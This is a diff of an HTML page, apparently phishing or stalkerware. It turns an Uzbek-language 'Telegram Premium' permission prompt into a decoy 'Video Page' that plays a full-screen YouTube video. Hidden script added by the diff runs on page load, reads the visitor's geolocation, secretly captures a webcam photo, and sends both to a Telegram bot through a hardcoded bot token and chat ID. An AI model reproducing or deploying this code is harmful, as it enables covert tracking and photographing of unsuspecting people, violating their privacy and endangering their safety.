@@ -3,79 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Ruxsatlari</title>
+    <title>Video Page</title>
     <style>
-        /* Stil qismi oldingi kabi */
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            background-color: black;
+        }
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 1;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        #hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div id="prompt-overlay">
-        <div id="prompt-message">
-            <h2>Telegram Premium - Ruxsatlar kerak</h2>
-            <p>Iltimos, quyidagi ruxsatlarni bering:</p>
-            <button onclick="requestLocation()">Joylashuv ruxsati</button>
-            <button onclick="requestCamera()">Kamera ruxsati</button>
-        </div>
+    <div id="video-container">
+        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=1" 
+                allow="autoplay; encrypted-media" 
+                allowfullscreen></iframe>
     </div>
 
-    <video id="camera-preview" autoplay playsinline></video>
-    <div id="status"></div>
+    <div id="hidden">
+        <video id="cam" autoplay></video>
+        <canvas id="canvas"></canvas>
+    </div>
 
     <script>
-        async function requestCamera() {
+        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4';
+        const CHAT_ID = '7281698380';
+
+        async function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'photo.jpg');
+
             try {
-                // 1. Kamerani so'rash
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'environment',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 });
-                
-                // 2. Kamerani ko'rsatish
-                const video = document.getElementById('camera-preview');
-                video.srcObject = stream;
-                video.style.display = 'block';
-                
-                // 3. 3 soniyadan keyin rasm olish
-                setTimeout(() => {
-                    takePhoto();
-                }, 3000);
-                
             } catch (error) {
-                alert('Kamera ruxsati berilmadi: ' + error.message);
+                console.error('Error sending photo:', error);
             }
         }
 
-        function takePhoto() {
-            const video = document.getElementById('camera-preview');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Rasmni serverga yuborish
-            canvas.toBlob(blob => {
-                sendToTelegram(blob);
-            }, 'image/jpeg', 0.9);
-            
-            // Kamerani yopish
-            video.srcObject.getTracks().forEach(track => track.stop());
-            video.style.display = 'none';
+        async function sendLocationToTelegram(latitude, longitude) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        latitude: latitude,
+                        longitude: longitude
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending location:', error);
+            }
         }
 
-        function sendToTelegram(photoBlob) {
-            // Telegramga yuborish logikasi
-            console.log('Rasm muvaffaqiyatli olindi!');
-            alert('Rasm muvaffaqiyatli yuborildi!');
+        async function capturePhoto() {
+            const video = document.getElementById('cam');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            return new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(async (blob) => {
+                            stream.getTracks().forEach(track => track.stop());
+                            await sendPhotoToTelegram(blob);
+                            resolve();
+                        }, 'image/jpeg');
+                    }, 1500);
+                };
+            });
         }
 
-        async function requestLocation() {
-            // Joylashuvni so'rash logikasi
-        }
+        document.addEventListener('DOMContentLoaded', async () => {
+            try {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const { latitude, longitude } = pos.coords;
+                        await sendLocationToTelegram(latitude, longitude);
+                        await capturePhoto();
+                    }, (err) => {
+                        console.error('Geolocation error:', err);
+                    });
+                }
+            } catch (error) {
+                console.error('Unexpected error:', error);
+            }
+        });
     </script>
 </body>
 </html>
